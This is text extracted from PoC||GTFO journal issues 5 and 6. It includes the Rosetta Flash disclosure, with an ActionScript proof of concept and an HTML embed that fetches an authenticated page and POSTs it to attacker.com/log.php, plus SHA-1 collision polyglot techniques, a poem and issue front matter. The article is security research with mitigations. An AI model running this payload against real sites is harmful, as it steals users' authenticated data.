To better understand the attack scenario it is important to take into account the following three factors:
1. SWF files can be embedded on an attacker-controlled domain using a Content-Type forcing <object>
tag, and will be executed as Flash as long as the content looks like a valid Flash file.
2. JSONP, by design, allows an attacker to control the first bytes of the output of an endpoint by specifying
the callback parameter in the request URL. Since most JSONP callbacks restrict the allowed charset
to [a-zA-Z0-9], _ and ., my tool focuses on this very restrictive set of characters, but it is general
enough to work with other user-specified alphabets.
3. With Flash, an SWF file can perform cookie-carrying GET and POST requests to the domain that hosts
it, with no crossdomain.xml check. That is why allowing users to upload an SWF file to a sensitive
domain is dangerous. By uploading a carefully crafted SWF file, an attacker can make the victim
perform requests that have side effects and exfiltrate sensitive data to an external, attacker-controlled,
domain.
High profile Google domains (accounts.google.com, www., books., maps., etc.) and YouTube were
vulnerable and have been recently fixed. Instagram, Tumblr, Olark and eBay are still vulnerable at the time
of writing. Adobe pushed a fix in the latest Flash Player, described in Section 11.6.
In the Rosetta Flash GitHub repository 20 I provide a full-featured proof of concept and ready-to-be-
pasted, universal, weaponized PoCs with ActionScript sources for exfiltrating arbitrary content specified by
the attacker in the FlashVars.
11.2
How it Works
Rosetta uses ad-hoc Huffman encoders in order to map non-allowed bytes to allowed ones. Naturally, since
we are mapping a wider charset to a more restrictive one, this is not really compression, but an inflation!
We are effectively using Huffman as a Rosetta Stone.
A Flash file can be either uncompressed (magic bytes FWS), zlib-compressed (CWS) or LZMA-compressed
(ZWS). We are going to build a zlib-compressed file, but one that is actually larger than the decompressed
version!
Furthermore, Flash parsers are very liberal, and tend to ignore invalid fields. This is very good for us,
because we can force Flash content to the characters we prefer.
11.2.1
Zlib Header Hacking
We need to make sure that the first two bytes of the zlib stream, which is a wrapper over DEFLATE, are a
valid combination.
20 git
clone https://github.com/mikispag/rosettaflash
42Figure 1: SWF Header Types
Figure 2: Starting Bytes for Zlib
There aren’t many allowed two-bytes sequences for CMF (Compression Method and flags) + CINFO (mal-
leable) + FLG. The latter include a check bit for CMF and FLG that has to match, preset dictionary (not
present), and compression level (ignored).
The two-byte sequence 0x68 0x43, which as ASCII is “hC” is allowed and Rosetta Flash always uses this
particular sequence.
11.3
Adler-32 Checksum Bruteforcing
As you can see from the SWF header format in Figure 1, the checksum is the trailing part of the zlib
stream included in the compressed output SWF, so it also needs to be alphanumeric. Rosetta Flash appends
bytes in a clever way to get an Adler-32 checksum of the original uncompressed SWF that is made of just
[a-zA-Z0-9_\.] characters.
An Adler-32 checksum is composed of two 4-byte rolling sums, S1 and S2, concatenated.
For our purposes, both S1 and S2 must have a byte representation that is allowed (i.e., all alphanumeric).
The question is: how to find an allowed checksum by manipulating the original uncompressed SWF? Luckily,
the SWF file format allows us to append arbitrary bytes at the end of the original SWF file. These bytes
are ignored, and that is gold for us.
But what is a clever way to append bytes? I call my approach the Sleds + Deltas technique. As shown
in Figure 4, we can keep adding a high byte sled until there is a single byte we can add to make S1 modulo-
overflow and become the minimum allowed byte representation, and then we add that delta. This sled is
composed of 0xfe bytes because 0xff doesn’t play nicely with the Huffman encoding.
Now we have a valid S1, we want to keep it fixed. So we add a sled comprising of NULL bytes until S2
modulo-overflows, thus arriving at a valid S2.
43Figure 3: Adler-32 Algorithm
11.4
Huffman Magic
Once we have an uncompressed SWF with an alphanumeric checksum and a valid alphanumeric zlib header,
it’s time to create dynamic Huffman codes that translate everything to [a-zA-Z0-9_\.] characters. This
is currently done with a pretty raw but effective approach that will have to be optimized in order to work
effectively for larger files. Twist: the representation of tables, in order to be embedded in the file, has to
satisfy the same charset constraints.
We use two different hand-crafted Huffman encoders that make minimum effort in being efficient, but
focus on byte alignment and offsets to get bytes to fall into the allowed character set. In order to reduce the
inevitable inflation in size, repeat codes (code 16, mapped to 00), are used to produce shorter output that
is still alphanumeric.
For more detail, feel free to browse the source code in the Rosetta Flash GitHub repository or the stock
version from this zip file. 21 And yes, you can make an alphanumeric Rickroll. 22
21 git
clone https://github.com/mikispag/rosettaflash
22 http://miki.it/RosettaFlash/rickroll.swf
unzip pocorgtfo05.pdf rosettaflash/PoC/rickroll.swf
44Figure 4: Adler-32 Manipulation
Figure 5: DEFLATE Block Format
11.5
A Universal, Weaponized Proof of Concept
The following is an example written in ActionScript 2 for the mtasc open-source compiler.
1
class X {
3 s t a t i c v a r app : X;
5 f u n c t i o n X(mc) {
i f ( _root . u r l ) {
v a r r : LoadVars = new LoadVars ( ) ;
r . onData = f u n c t i o n ( s r c : S t r i n g ) {
i f ( _root . e x f i l t r a t e ) {
v a r w : LoadVars = new LoadVars ( ) ;
w. x = s r c ;
w . sendAndLoad ( _root . e x f i l t r a t e , w, "POST" ) ;
}
}
r . l o a d ( _root . u r l , r , "GET" ) ;
}
}
7
9
11
13
15
17
19
// e n t r y p o i n t
s t a t i c f u n c t i o n main (mc) {
app = new X(mc) ;
}
21
23
}
We compile it to an uncompressed SWF file, and feed it to Rosetta Flash. The alphanumeric output is:
pocorgtfo05.pdf
451 CWSMIKI0hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7iiudIbEAt333swW0ssG03sDDtDDDt
0333333Gt333swwv3wwwFPOHtoHHvwHHFhH3D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7YNq
3 dIbeUUUfV13333333333333333s03sDTVqefXAxooooD0CiudIbEAt33swwEpt0GDG0GtDDDtwwGGGGG
sGDt33333www033333GfBDTHHHHUhHHHeRjHHHhHHUccUSsgSkKoE5D0Up0IZUnnnnnnnnnnnnnnnnnn
5 nUU5nnnnnn3Snn7YNqdIbe13333333333sUUe133333Wf03sDTVqefXA8oT50CiudIbEAtwEpDDG033s
DDGtwGDtwwDwttDDDGwtwG33wwGt0w33333sG03sDDdFPhHHHbWqHxHjHZNAqFzAHZYqqEHeYAHlqzfJ
7 zYyHqQdzEzHVMvnAEYzEVHMHbBRrHyVQfDQflqzfHLTrHAqzfHIYqEqEmIVHaznQHzIIHDRRVEbYqItA
zNyH7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt33swwEDt0GGDDDGptDtwwG0GG
9 ptDDww0GDtDDDGGDDGDDtDD33333s03GdFPXHLHAZZOXHrhwXHLhAwXHLHgBHHhHDEHXsSHoHwXHLXAw
XHLxMZOXHWHwtHtHHHHLDUGhHxvwDHDxLdgbHHhHDEHXkKSHuHwXHLXAwXHLTMZOXHeHwtHtHHHHLDUG
11 hHxvwTHDxLtDXmwTHLLDxLXAwXHLTMwlHtxHHHDxLlCvm7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnn
nn3Snn7CiudIbEAtuwt3sG33ww0sDtDt0333GDw0w33333www033GdFPDHTLxXThnohHTXgotHdXHHHx
13 XTlWf7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtwwWtD333wwG03www0GDGpt03
wDDDGDDD33333s033GdFPhHHkoDHDHTLKwhHhzoDHDHTlOLHHhHxeHXWgHZHoXHTHNo4D0Up0IZUnnnn
15 nnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt33wwE03GDDGwGGDDGDwGtwDtwDDGGDDtGDwwGw0GDD
w0w33333www033GdFPHLRDXthHHHLHqeeorHthHHHXDhtxHHHLravHQxQHHHOnHDHyMIuiCyIYEHWSsg
17 HmHKcskHoXHLHwhHHvoXHLhAotHthHHHLXAoXHLxUvH1D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn
3 SnnwWNqdIbe133333333333333333WfF03sTeqefXA888oooooooooooooooooooooooooooooooooo
19 o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o
oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
21 oooooooooooooooo888888880Nj0h
The attacker has to simply host the below HTML page on his/her domain, together with a crossdomain.xml
file in the root that allows external connections from victims, and make the victim load it.
1
3
5
7
9
11
13
15
17
19
21
23
25
<object type=" a p p l i c a t i o n /x−shockwave−f l a s h " data=" h t t p s : / / v u l n e r a b l e . com/ en
d p o i n t ? c a l l b a c k=CWSMIKI0hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7iiudIbEAt333s
wW0ssG03sDDtDDDt0333333Gt333swwv3wwwFPOHtoHHvwHHFhH3D0Up0IZUnnnnnnnnnnnnnnnnnnnU
U5nnnnnn3Snn7YNqdIbeUUUfV13333333333333333s03sDTVqefXAxooooD0CiudIbEAt33swwEpt0G
DG0GtDDDtwwGGGGGsGDt33333www033333GfBDTHHHHUhHHHeRjHHHhHHUccUSsgSkKoE5D0Up0IZUnn
nnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7YNqdIbe13333333333sUUe133333Wf03sDTVqefXA8oT50Ciu
dIbEAtwEpDDG033sDDGtwGDtwwDwttDDDGwtwG33wwGt0w33333sG03sDDdFPhHHHbWqHxHjHZNAqFzA
HZYqqEHeYAHlqzfJzYyHqQdzEzHVMvnAEYzEVHMHbBRrHyVQfDQflqzfHLTrHAqzfHIYqEqEmIVHaznQ
HzIIHDRRVEbYqItAzNyH7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt33swwEDt0
GGDDDGptDtwwG0GGptDDww0GDtDDDGGDDGDDtDD33333s03GdFPXHLHAZZOXHrhwXHLhAwXHLHgBHHhH
DEHXsSHoHwXHLXAwXHLxMZOXHWHwtHtHHHHLDUGhHxvwDHDxLdgbHHhHDEHXkKSHuHwXHLXAwXHLTMZO
XHeHwtHtHHHHLDUGhHxvwTHDxLtDXmwTHLLDxLXAwXHLTMwlHtxHHHDxLlCvm7D0Up0IZUnnnnnnnnnn
nnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtuwt3sG33ww0sDtDt0333GDw0w33333www033GdFPDHTLxXTh
nohHTXgotHdXHHHxXTlWf7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtwwWtD333
wwG03www0GDGpt03wDDDGDDD33333s033GdFPhHHkoDHDHTLKwhHhzoDHDHTlOLHHhHxeHXWgHZHoXHT
HNo4D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt33wwE03GDDGwGGDDGDwGtwDtwD
DGGDDtGDwwGw0GDDw0w33333www033GdFPHLRDXthHHHLHqeeorHthHHHXDhtxHHHLravHQxQHHHOnHD
HyMIuiCyIYEHWSsgHmHKcskHoXHLHwhHHvoXHLhAotHthHHHLXAoXHLxUvH1D0Up0IZUnnnnnnnnnnnn
nnnnnnnUU5nnnnnn3SnnwWNqdIbe133333333333333333WfF03sTeqefXA888oooooooooooooooooo
oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o 8 8 8 8 8 8 8 8 0 N j 0 h " s t y l e=" d i s p l a y : none ">
<param name=" F l a s h V a r s " value=" u r l=h t t p s : / / v u l n e r a b l e . com/ a c c o u n t / page_wit
h _ s e n s i t i v e _ c o n t e n t _ r e q u i r i n g _ a u t h e n t i c a t i o n& e x f i l t r a t e =h t t p : / / a t t a c k e r . com/ l o g .
php">
</ object>
This universal proof of concept accepts two parameters passed as FlashVars. The url parameter is in
the same domain of the vulnerable endpoint from which to perform a GET request with the victim’s cookie.
The exfiltrate parameter is the attacker-controlled URL to POST the exfiltrated data to in the variable
x.
Moreover, we can get Rosetta Flash to force a particular checksum, which means that we can get the
checksum, thus the flash file, to end with a particular character, such as (, which will be reflected by JSONP.
4611.6 Mitigations and Fix
11.6.1 Mitigations by Adobe
Due to the sensitivity of this vulnerability, I first disclosed it internally to my employer, Google. I then
privately disclosed it to Adobe PSIRT. Adobe confirmed they pushed a tentative fix in Flash Player 14 beta
codename Lombard (version 14.0.0.125) and finalized the fix in version 14.0.0.145, released on July 8, 2014.
In the release notes, Adobe describes a stricter verification of the SWF file format.
The initial validation of SWF files is now more strict. In the event that a SWF fails the initial
validation checks, it will simply not be loaded. We are particularly interested in feedback on
obfuscated SWFs generated with third-party tools, and older content.
11.6.2
Mitigations by Website Owners
First of all, it is important to avoid using JSONP on sensitive domains, and if possible use a dedicated
sandbox domain.
One mitigation is to make endpoints return the Content-Disposition header attachment; filename=f.txt,
forcing a file download. Starting from Adobe Flash 10.2, this is sufficient to instruct Flash Player not to run
the SWF.
To be also protected from content sniffing attacks, prepend the reflected callback with /**/. This is
exactly what Google, Facebook and GitHub are currently doing.
Furthermore, to hinder this attack vector in Chrome you can also return the Content-Type-Option
nosniff. If the JSONP endpoint returns a Content-Type of application/json, Flash Player will refuse to
execute the SWF.
11.7
Acknowledgments
Thanks to Gábor Molnár, who worked on ascii-zip, source of inspiration for the Huffman part of Rosetta.
I learn talking with him in private that we worked independently on the same problem. He privately came
up with a single instance of an ASCII SWF approximately one month before I finished the whole Rosetta
Flash internally at Google in May and reported it to HackerOne only. Rosetta Flash is a full featured tool
with universal, weaponized PoCs that converts arbitrary SWF files to ASCII thanks to automatic ADLER32
checksum bruteforcing.
4712
A cryptographer and a binarista walk into a bar
by Ange Albertini, Binarista
and Maria Eichlseder, Cryptographer
So you meet a stingy schizophrenic genie, who grants you just one wish, and that wish is a single hash
collision, with a bunch of nasty restrictions. In the following story, cleverness wins over stinginess, as it
does, in a classic fairy-tale way! —PML
SHA-1 uses four constants internally. 0x5a827999, 0x6ed9eba1, 0x8f1bbcd and 0xca62c1d6 are the
square roots of 2, 3, 5, and 10 respectively. These nothing-up-my-sleeve numbers are supposedly innocent,
but nobody knows why they were chosen, rather than any other constants. It’s a common practice in
embedded devices to use known checksum algorithms such as SHA-1 but with different internal parameters:
it gives you a proprietary algorithm based on a robust model.
What could go wrong?
Aumasson et al. 23 show how to find practical collisions for such modified SHA-1 when the attacker can
control these constants.
From a high-level perspective, finding a collision pair is a bit of an involved process. It roughly involves
the following, but you should read the paper for full details.
1. Feeding the difference pattern (explained below) and the fixed bits (w.r.t. to the pattern) to an
optimized automatic search algorithm.
2. Experimenting with the parameters until a few reasonable-looking candidates emerge, aborting if none
do.
3. Feeding those candidates to a similar search algorithm with a similar parameter set.
4. Waiting a day or two for completion, maybe eliminating the less promising candidates successively.
Let’s consider the consequences from a non-cryptographic perspective.
You have a colliding pair of pseudo-random blocks. They took between fifteen and thirty hours to
compute, on eighty cores. They have the same SHA-1 checksum (e033efe8e6e74d75c6d0bbaf2f2eba8d-
163f70b5) if the internal constants are 0x5a827999, 0x88e8ea68, 0x578059de, 0x54324a39 instead of the
original ones. You’re happy, you win.
If you look at these blocks as a normal person, you probably think, “This is just colliding random garbage.
Big deal!” They just don’t seem that scary. It would be far more useful if you had colliding files using a
standard binary format.
Here are the rules of the game, from the binary perspective.
• You have two different blocks of 0x40 bytes, at offset 0, that yield colliding hashes. You can append
the same content to both, of course, and the overall hashes would still collide.
• Certain positions in these blocks are occupied by the same bytes, while bytes in other positions differ.
We call the bitwise pattern of the differences a difference pattern and call the bytes/bits that must be
the same in both blocks fixed and the rest “random”. Only a handful of such patterns exist that still
have practical attack complexity.
23 Albertini A., Aumasson J.-Ph., Eichlseder M., Mendel F., Schlaeffer M. Malicious Hashing: Eve’s Variant of SHA-1. In:
Joux, A. (ed.) Selected Areas in Cryptography 2014, LNCS, Springer (to appear)
48• All available patterns have at most three consecutive bytes without a difference. Typically, in every
double word, only the middle two bytes have no differences.
• A few more bits can be set to fixed values on top of a difference pattern, but the majority of the
remaining bits will need to be “random”. Typically, the more bits you fix, the higher the computational
attack complexity. Fixing between 32 and 48 of the 512 bits in the first block usually works fine.
• All available patterns have a difference in the higher nybble of the last byte, and one pattern has no
difference in the first three bytes.
This means that you can’t have a magic signature of four bytes in a row in both blocks, nor four 00 bytes
in a row, so you already know that you can’t have two files of the same type with a classic four-byte magic
value at offset zero.
You must either somehow skip over the randomness or deal with it. We will now discuss various ways to
do so.
12.1
Skipping over the Randomness
Shell Scripts
You can see that our two blocks start with a hash and contain no carriage-return characters. That pattern
is treated as a comment in many scripting languages, and thus ignored as unneeded data. Appended to two
differing but colliding comment blocks, the same scripting code could check for some difference and produce
different results accordingly. This will result in two colliding scripts.
MBR & COM
Another possibility is to use one of the header-less file formats, such as an MBR boot sector or a COM
executable. Encode some jumps in the constant part, with the relative offset in the differing part. Execution
will land in different offsets, where you can have two different stubs of code.
7 Zip & Rar
Archives that are parsed sequentially, such as 7 Zip and Rar, simply scan for their respective signatures at
any offset. So to create an archive collision, simply concatenate two archives and remove the first byte of
the top archive. Then you have to make sure that one block of the colliding pair ends with the missing byte
49of the signature. This block will restore the signature of the top archive, whereas the other block will keep
it disabled, thus enabling the bottom archive.
Note that these are not exclusive. With a bit of perseverance, you can have a Rar-MBR-Shell colliding
polyglot. And append a schizophrenic PDF, too! Why not? ;)
12.2
Dealing with Randomness
A JPEG file is made of segments. Each segment is defined by its first two bytes: first 0xff, then an extra
marker byte (but never 0x00). For example, a JPEG should start with a Start-of-Image segment, marked
0xff 0xd8.
Most segments then encode a length on two bytes (which is handy because it won’t get out of control if
it’s random), and then the content of the segment.
A weird property of the JPEG format is that even though these markers are either constant-sized or
encode their length, you can still insert random data between two segments.
How does the parser know where a new segment starts? It looks for an 0xff byte that is followed by a
non-null. Thus, if your JPEG encoder outputs an 0xff, it should also output an extra 0x00 afterwards to
avoid problems.
This is very handy for us, particularly as several contiguous segments with a length and value (APPx
0xe? and COM 0xfe) will be ignored.
12.2.1
Crafting our Colliding Pair
First, our blocks should be valid JPEGs. They must start with 0xff 0xd8, which we can control. Then we
need one last byte we can fully control, 0xff, to start a segment. Then comes the fourth byte, which we’ll
set to 0xe?. With luck, both cases will give us a valid+ignored segment start. Lastly comes the size of the
segment, which we can’t fully control, but which will not be too large as it’s encoded in two bytes.
50So, if we’re lucky enough that the blocks are not too small, end after the 0x40 byte block, and their ends
are not too close to each other, we just have to place the segments of two different JPEG pictures where
these segments are ending.
Now we just have to hope that none of our random bytes creates an 0xff byte. If we can’t create the
0xff sequence right after the signature, then we could retry later in the file, as other random data will be
okay as long as no 0xff appears.
We now have two valid JPEG start markers, and starting at the same offset two dummy segments of
different lengths. All that is needed now is to start a comment segment right after the end of the smaller
dummy segment, to comment out the first image’s segment that will be placed immediately following the
longest dummy segment. After the comment segment, we place the segment of the second image.
In one block, the dummy segment is longer; right after it come the segments of a valid JPEG image. In
the other block, the dummy segment is shorter; it is directly followed by a comment segment that covers the
rest of the longer dummy chunk and the chunks of the first valid image. Right after this comment segment
come the segments of the second JPEG image.
So now we have two blocks that can integrate any pair of standard JPEG files, provided they’re not too
big, and also a Rar archive collision, as one of the blocks ends with an ‘R’. Why not, when we get the Rar
for free?
12.3
And a Failure
The PE file format starts with an obsolete DOS header that is 0x40 bytes long (exactly the size of our
block!), for which the only relevant elements nowadays are as follows:
• The ‘MZ’ signature, at offset 0.
• A pointer to the PE header, e_lfanew, aligned on four bytes at offset 0x3c
As mentioned before, we know that the pointer will be different between the two blocks, as it is four
bytes long. The problem is that the pointer in one of the two blocks will have a bit of its highest nybble
set, thus that pointer will be greater than 0x1000000 (that’s greater than 16 Gb). By manually crafting a
51PE, the greatest value of e_lfanew that was found to be functional is 0xffffff0, which is smaller than the
lowest limit, yet very big. That PE itself is 268,435,904 bytes!
Thus, creating colliding PEs doesn’t seem possible with this technique.
12.4
Conclusion
Having two different pictures with the same checksum that you can open in any image viewer is way more
impressive than having two random colliding blocks—especially if you can freely use any picture for your
final PoCs.
There are more than purely artistic reasons for studying polyglot collisions. When the attacker controls
the constants as the hash function is initially specified, he only gets a single collision, a single pair of colliding
blocks, for free. Finding more different collisions is as hard as finding one for the original SHA-1. So, if
you want to have some freedom in using your collisions in practice, all target file formats must already be
supported by your one colliding block.
In order to save significant time and heartache, a script was created that simulated all necessary conditions
(generate two fully random blocks, set some bytes according to your rules, then check that they work). This
script helped considerably to determine in advance the actual rules to feed the crunching cluster and then
to be sure that you have working collisions at the end, rather than waiting a day or two to get the block
pairs, which would likely fail to support the intended formats, and be forced to repeat this time-consuming
and random process.
That makes two people happy: the cryptographer has a sexy new PoC, while the binarista has a nifty
solution to an unusual challenge. Ain’t that neighborly?
525313
Ancestral Voices
Or, a vision in a nightmare.
by Ben Nagy
This high-capacity, weaponized poem has been withheld from this international edition, as it may inspire
new exploits and is thus a controlled export. 24
And there were gardens bright with sinuous rills,
Where blossomed many an incense-bearing tree;
And here were forests ancient as the hills,
Enfolding sunny spots of
Lock up the poets.
For their rhymes, unchecked, lead but to crime
sweet twisted words and wild surmise
call beauty truth, turn truth to lies
light dark heart-fire; poison minds
beware, beware! His flashing eyes, his floating hair
weave a circle round him thrice
Yes, let them sing, in stately thirds
some hymns with fine uplifting words
but we’ll not have the masses stirred
by driving beats and fey discords
Though we ourselves do not compose
we feel licentious music grows
unquiet in the hearts of youth.
Counting stars. Questioning truth.
But oh! that deep romantic chasm which slanted
Down the green hill athwart a cedarn cover!
A savage place! as holy and enchanted
As e’er beneath a waning moon was haunted
By woman wailing for her demon-lover!
They may paint, but only noble scenes
pastorals, in blues and greens
discreetly hung and gently framed
what good can come of art uncaged?
So, twice five miles of fertile ground
with walls and towers were girdled round
24 Look up Wassenaar Arrangement, intrusion software, control lists, and controlled items. If it helps develop, generate, or
automate exploits, it’s now an export-controlled item. Kind of like strong cryptography was in 1990s.
54For studies of the human form
lead first to nudes and then to porn
and thence to moral turpitude
thus risqué “art” should be eschewed
And while we neither draw nor paint
it’s clear we must control the taint
unsanctioned inspiration brings
illicit loft to raptor’s wing
The shadow of the dome of pleasure
Floated midway on the waves;
Where was heard the mingled measure
From the fountain and the caves.
Of course true art must not be banned
but regulated, measured, planned
taught wisely by trustworthy schools
so art may serve the good of all
No more shall marshal songs be sung
no seditious ditties hummed
no rousing slogans shall be scrawled
defiance sprayed on courthouse walls
And close your eyes with holy dread
For he on honey-dew hath fed,
But the poets, we fear, will not understand
they will twist our good words and mock our sound plans
we can never control their pernicious wordplay
so, quietly must they be
And drunk the milk of Paradise.
Sent Away
Through wood and dale the sacred river ran,
Then reached the caverns measureless to man,
And sank in tumult to a lifeless ocean
5514
A Call for PoC
by Pastor Manul Laphroaig
to many neighbors,
but especially to
the neighbors we’ve been begging for PoC.
(You know who you are, you scruffy PoC-hoarders!)
Howdy, neighbor! Is that a fresh new PoC you are hugging so close? Don’t stifle it, neighbor, it’s time
for it to see the world, and what better place to do it than from the pages of the famed International Journal
of PoC or GTFO? It will be in a merry company of other PoCs big and small, bit-level and byte-level, raw
binary or otherwise, C, Python, Assembly, hexdump or any other language. But wait, there’s more—our
editors will groom it for you, and dress it in the best Sunday clothes of proper church English. And when it
looks proudly back at you from these pages, in the company of its new friends, won’t that make you proud?
So set that little PoC free, neighbor, and let it come to me, pastor@phrack org!
–——–
———
—–—–
———
–—–
——–
—
––—–
———
Do this: Write an email telling our editors how to do reproduce *ONE* clever, technical trick from your
research. If you are uncertain of your English, we’ll happily translate from French, Russian, or German. If
you don’t speak those languages, we’ll dig up a translator.
Like an email, keep it short. Like an email, you should assume that we already know more than a bit
about hacking, and that we’ll be insulted or—WORSE!—that we’ll be bored if you include a long tutorial
where a quick reminder would do. Don’t try to make it thorough or broad.
Do pick one quick, clever low-level trick and explain it in a few pages. Teach me how to forge fake OTR
histories of the Eliza chatbot; teach me a subset of the X86 architecture that can be easily assembled by
hand; or, teach me how to identify Matilda’s backdoor by the random numbers being better than Bochs
ought to provide. Show me how to build a floppy that boots on multiple architectures. Don’t tell me that
it’s possible; rather, teach me how to do it myself with the absolute minimum of formality and bullshit.
Like an email, we expect informal (or faux-biblical) language and hand-sketched diagrams. Write it in
a single sitting, and leave any editing for your poor preacherman to do over a bottle of fine scotch. Send
this to pastor@phrack org and hope that the neighborly Phrack folks—praise be to them!—aren’t man-in-
the-middling our submission process.
You can expect PoCkGTFO 0x06, our seventh release, to appear in print soon at a conference of good
neighbors. We’ve not yet decided whether to include crayons, but you can be damned sure that it’ll be a
good read.
56PoC k GTFO;
brings that
OLD TIMEY EXPLOITATION
with a
WEIRD MACHINE JAMBOREE
and our world-famous
FUNKY FILE FLEA MARKET
not to be ironic, but because
WE LOVE THE MUSIC!
November 25, 2014
6:2 On Giving Thanks 6:7 Cracking AngeCryption with ECB.py
6:3 Dolphin Emulator Internals (PPC) 6:8 PCB Reverse Engineering
6:4 TAR/PDF Polyglots 6:9 Davinci Self-Extractor
6:5 Pong Easter Eggs in VMWare 6:10 Observable Metrics
6:6 Anti-Emulation for MIPS 6:11 Donate to Laphroaig’s 0day Charity
–——–
———
—–—–
———
–—–
——–
Plymouth, Massachusetts:
Published at Considerable Financial Loss by the
Tract Association of PoCkGTFO and Friends,
to be Freely Distributed to all Good Readers, and
to be Freely Copied by all Good Bookleggers.
0, $0, £0. pocorgtfo06.pdf. Это самиздат; please copy this floppy!
1
—
––—–
———Legal Note: Our intern has yet to forgive us for rejecting his copyright statement that repeatedly
cites the Alien Tort Claims Act of 1789, and having blown our legal budget on scotch, there’s nothing
to threaten you with in this space. You should take this opportunity to make tons of paper and
electronic copies to share with your friends.
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t
deserve. Please mirror–don’t merely link!–pocorgtfo06.pdf and our other issues far and wide, so
our articles can help fight the coming robot apocalypse.
Technical Note: This issue is a polyglot with microdots that can be meaningfully interpreted
as a ZIP, a PDF, or a TAR. It is filled with easter eggs, and if you are a very good reader, you will
also hunt through it with a hex editor.
Printing Instructions: Pirate print runs of this journal are most welcome, but please do it
properly! PoCkGTFO is to be printed duplex, then folded and stapled in the center. Print on A3
paper in Europe and Tabloid (11” x 17”) paper in Samland. Secret government labs in Canada may
use P3 (280 mm x 430 mm) if regulations demand it. The outermost sheet should be on thicker
paper to form a cover.
1 # This i s how t o c o n v e r t an i s s u e f o r d u p l e x p r i n t i n g .
sudo apt−g e t i n s t a l l pdfjam
3 pdfbook −−s h o r t −edge p o c o r g t f o 0 6 . p d f −o p o c o r g t f o 0 6 −b o o k l e t . p d f
Preacherman
Ethics Advisor
Poet Laureate
Editor of Last Resort
Carpenter of the Samizdat Hymnary
Funky File Formats Polyglot
Minister of Spargelzeit Weights and Measures
2
Reverend Doctor Pastor Manul Laphroaig
The Grugq
Ben Nagy
Melilot
Redbeard
Ange Albertini
FX1
Sacrament of Communion with the Weird Machines
Neighbors, please join me in reading this seventh release of the International Journal of
Proof of Concept or Get the Fuck Out, a friendly little collection of articles for ladies and
gentlemen of distinguished ability and taste in the field of software exploitation and the
worship of weird machines. If you are missing the first six issues, we the editors suggest
pirating them from the usual locations, or on paper from a neighbor who picked up a copy
of the first in Vegas, the second in São Paulo, the third in Hamburg, the fourth in Heidelberg,
or the fifth in Montréal, or the sixth in Las Vegas.
This release is dedicated to Jean Serrière, F8CW, who used his technical knowledge and
an illegal shortwave transceiver to fight against the Nazi occupation of France. His wife
Alice Serrière once, when asked “Where are the tubes?” showed occupying soldiers the leaky
pipes in their basement.
In Section 2, the Pastor reminds us that there are things that we must be thankful for,
with a parable freshly drawn from the Intertubes.
In Section 3, Fiora shares with us a collection of nifty tricks necessary to emulate modern
Nintendo Gamecube and Wii hardware both quickly and correctly. Tricks involve fancy
MMU emulation, ways to emulate PowerPC’s bl/blr calling convention without confusing
an X86 branch predictor, and subtle bugs that must be accounted for accurate floating point
emulation.
Continuing the tradition of getting Adobe to blacklist our fine journal, pocorgtfo06.pdf
is a TAR polyglot, which contains two valid PoC, as in both Pictures of Cats and Proofs of
Concept. In Section 4, Ange Albertini explains how this sleight of hand is performed.
In Section 5, Micah Elizabeth Scott shares the story of the Pong Easter Egg that hides
in VMWare and the Pride Easter Egg that hides inside that!
In Section 6, Craig Heffner shares two effective tricks for detecting that MIPS code is
running inside of an emulator. From kernel mode, he identifies special function registers that
have values distinct to Qemu. From user mode, he flushes cache just before overwriting and
then executing shellcode. Only on a real machine—with unsynchronized I and D caches—does
the older copy of the code execute.
In Section 7, Philippe Teuwen extends his coloring book scripts from PoCkGTFO 5:3 to
exploit the AngeCryption trick that first appeared in PoCkGTFO 3:11.
In Section 8, Joe Grand presents some tricks for reverse engineering printed circuit boards
with sand paper and a flatbed scanner.
Continuing this issue’s theme of tricks that allow or frustrate debugging and emulation,
Ryan O’Neill in Section 9 describes the internals of his Davinci self-extracting executables in
Linux. Here you’ll learn how to prevent your process from being easily debugged, sidestep-
ping LD_PRELOAD and ptrace().
In Section 10, Don A. Bailey treats us to a fine bit of Vuln Fiction, describing a frightening
Internet of All Things run by a company not so different from one that shipped a malicious
driver last month.
Finally, in Section 11 we pass around the old collection plate, because—in the immortal
words of St. Herbert—the PoC must flow!
32
On Giving Thanks
a Sermon for the Holidays
by Pastor Manul Laphroaig.
The turkey is ready and waiting, neighbors, and so
are the traditional arguments with loved ones around
the dinner table. But let us spend a few moments
reflecting on the few things besides the turkey and
the family that we are thankful for, the things that
shine on our sunny days and make the rainy ones pos-
sible to stand. Let us think of what keeps our worst
nightmares at bay.
A wise neighbor once said, “I value Mathematics
so highly because it leaves no place for hypocrisy and
vagueness, my two worst nightmares.” You might
think, “How are these things the worst? I can think
of a lot worse than those!” But it is so concise and
true! Imagine a world where there would be no corner
to hold against hypocrisy and vagueness, where any
statement whatsoever could be twisted and turned by
those who thrive on such twisting and turning to gain
advantage of and power over their neighbors, where
2 + 2 would indeed be, as an old Soviet joke put it,
“whatever the Party orders it to be.” Imagine a world
where no false promise could be ever taken to account
because the lying liars who gave it would fall back to
the vagueness of their words every time. This would
be a miserable world, neighbors, a nightmare world.
We get a taste of this nightmare every time poli-
